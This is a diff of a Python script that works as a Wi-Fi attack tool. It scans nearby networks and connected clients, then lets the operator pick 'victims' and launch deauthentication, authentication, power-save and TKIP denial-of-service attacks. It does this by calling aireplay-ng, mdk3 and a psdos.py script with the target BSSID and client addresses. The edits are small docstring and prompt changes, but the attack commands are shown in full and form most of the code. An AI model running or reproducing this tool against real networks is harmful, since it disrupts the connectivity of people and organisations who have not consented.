@@ -31,9 +31,6 @@ def dump_network_info(Info):
     Saves all output from nmap and airodump-ng scans to a file.
     nmap results: FILE_PREFIX.xml
     airodump results: FILE_PREFIX.csv
-    TODO: What should this return or do on FAILURE?
-    Mary: recommends running nmap BEFORE airodump if applicable because
-    nmap in monitor mode may not work correctly.
     """
     # Wifi interface
     interface = subprocess.check_output(["nmcli", "-t", "-f", "DEVICE", "connection","show", "--active"]).decode().strip()
@@ -42,7 +39,6 @@ def dump_network_info(Info):
     # Sometimes this fails and says "command failed: Device or resource busy (-16)"
     sp1 = subprocess.Popen(["iw", "dev", interface, "link"], stdout=subprocess.PIPE)
     sp2 = subprocess.Popen(["grep", "SSID"], stdin=sp1.stdout, stdout=subprocess.PIPE)
-    # TODO: Handle user not being connected to a network
     user_ssid = subprocess.check_output(["cut", "-f2-", "-d:"], stdin=sp2.stdout).decode().strip()
     # Create a dictionary of ssids and bssids -- {ssid : bssid}
     iw_scan1 = subprocess.Popen(["sudo", "iw", interface, "scan"], stdout=subprocess.PIPE)
@@ -71,9 +67,8 @@ def dump_network_info(Info):
         # Get IPs
         sp = subprocess.Popen(["ip", "addr", "show", interface], stdout=subprocess.PIPE)
         ips = subprocess.check_output(["grep", "inet", "-m", "1"], stdin=sp.stdout).decode()[9:26]
-        # print(ips)
         sp.wait()
-        nmap = subprocess.call(["nmap", "--version-light", "-F", "-T4", "-n", "-sV", "-oX", FILE_PREFIX+".xml", ips], stdout=subprocess.DEVNULL) # should we print nmap results to screen too?
+        nmap = subprocess.call(["nmap", "--version-light", "-F", "-T4", "-n", "-sV", "-oX", FILE_PREFIX+".xml", ips], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print("Done.\n")
     else:
         print("You are not connected to " + victim_network + ".\n")
@@ -253,8 +248,9 @@ def handle_victims_choices(clients_table, clients):
 
 def execute_hack(info, victims):
     """
-    Takes network information and selected victims in order to
-    attack the victims or, if victims is false-ish, attacks the Access Point.
+    Takes in interface, BSSID, SSID, monitor interface names in order to attack the victim(s).
+    Available attacks are: Authentication DoS, Deauthentication DoS, Power Save DoS, and TKIP DoS
+    Tools used: mdk3, aireplay-ng, and psdos.py (courtesy of Core Security Technologies).
     """
 
     # Get channel
@@ -280,18 +276,18 @@ def execute_hack(info, victims):
 
     # CHECK VICTIMS
     if victims:
-        user_input = input("Enter A for AUTH DoS, D for DEAUTH DoS, P for POWER DRAIN, T for TKIP DoS: ").strip()
+        user_input = input("Enter A for AUTH DoS, D for DEAUTH DoS, P for POWER SAVE DoS, T for TKIP DoS: ").strip()
         if user_input.lower() == "d": # Deauth DoS
             for vic in victims:
                 subprocess.call(["x-terminal-emulator","-e","sudo", "aireplay-ng", "-0", "0", "-a", info.bssid, "-c", vic, "-e", info.ssid, info.mon_interface])
-        elif user_input.lower() == "p": # Power Drain
+        elif user_input.lower() == "p": # Power Save
             for vic in victims:
                 subprocess.call(["x-terminal-emulator","-e","sudo", "python", "psdos.py", info.mon_interface, vic, info.bssid, "nullfunction"])
         elif user_input.lower() == "a": # Authentication DoS
             subprocess.call(["sudo", "mdk3", info.mon_interface, "a", "-a", info.bssid])
         elif user_input.lower() == "t": # TKIP DoS
             subprocess.call(["sudo", "mdk3", info.mon_interface, "m", "-t", info.bssid])
-    else:
+    else:   # w/o Victims it is still admissable to launch an attack on the AP itself
         user_input = input("Enter A for AUTH DoS or T for TKIP DoS: ").strip()
         if user_input.lower() == "a": # Authentication DoS
             subprocess.call(["sudo", "mdk3", info.mon_interface, "a", "-a", info.bssid])
